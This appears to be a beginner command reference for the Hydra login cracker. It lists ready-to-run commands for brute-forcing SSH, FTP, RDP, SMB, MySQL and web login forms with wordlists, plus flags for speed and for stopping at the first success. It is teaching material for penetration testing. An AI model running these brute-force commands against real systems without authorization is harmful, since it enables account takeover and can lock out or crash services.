---
title: "Hydra Command List"
date: 2026-01-05
category: commands
enrich: false
tags: hydra, cybersecurity, command reference, beginner
description: Top 10 essential commands and a master guide for using Hydra in penetration testing.
---

# Hydra Command Guide

**Hydra** is a legendary parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, allowing researchers to demonstrate the risk of weak credentials.

## Top 10 Useful Commands

### 1. Basic SSH Crack
```bash
hydra -l fulluser -P passlist.txt ssh://192.168.1.1
```
**Explanation:** Attacks SSH using a known username (`-l`) and a password list (`-P`).

### 2. User & Pass List (Unknown Creds)
```bash
hydra -L userlist.txt -P passlist.txt ftp://192.168.1.1
```
**Explanation:** Tries every combination of username (`-L`) and password against an FTP server.

### 3. HTTP Post Form Crack
```bash
hydra -l admin -P passlist.txt 10.10.10.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Login failed"
```
**Explanation:** Cracks web logins. You specify the path, the body parameters (replacing user/pass with placeholders), and the Failure string (`F=`).

### 4. RDP Cracking
```bash
hydra -l Administrator -P passlist.txt rdp://192.168.1.1
```
**Explanation:** Targets Remote Desktop Protocol. Note: RDP can be slow and lock accounts quickly.

### 5. SMB (Windows) Cracking
```bash
hydra -L userlist.txt -P passlist.txt smb://192.168.1.1
```
**Explanation:** Attacks Windows file sharing (SMB). Useful for initial Active Directory access.

### 6. Show Attempts (Debug)
```bash
hydra -V -l user -P pass.txt ssh://target
```
**Explanation:** Verbose mode (`-V`). Shows every login attempt (user:pass combination). Good for checking progress.

### 7. Limit Threads (Stealth/Stability)
```bash
hydra -t 4 -l user -P pass.txt ssh://target
```
**Explanation:** Limits concurrent tasks to 4. Essential for older services (like Telnet) that crash under load.

### 8. Exit on Success
```bash
hydra -f -l user -P pass.txt ssh://target
```
**Explanation:** Stops the entire scan as soon as ONE valid password is found (`-f`). Saves time.

### 9. MySQL Cracking
```bash
hydra -l root -P pass.txt mysql://192.168.1.1
```
**Explanation:** Direct brute-force against a backend database port (3306).

### 10. Save Output
```bash
hydra -l user -P pass.txt ssh://target -o found.txt
```
**Explanation:** Saves found credentials to a file.

## The Most Powerful Command

The most effective way to use Hydra against a web form (the most common modern use case):

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.5 http-post-form "/admin/login.php:username=^USER^&password=^PASS^&Login=Login:F=Invalid username" -t 64 -f -V
```

**Why it's powerful:**
*   **Targeted Protocol**: Precise targeting of a specific web form.
*   **Fast**: Uses 64 threads (`-t 64`).
*   **Efficiency**: Stops on first success (`-f`).
*   **Verification**: Verbose output (`-V`) lets you verify the error string logic is working.

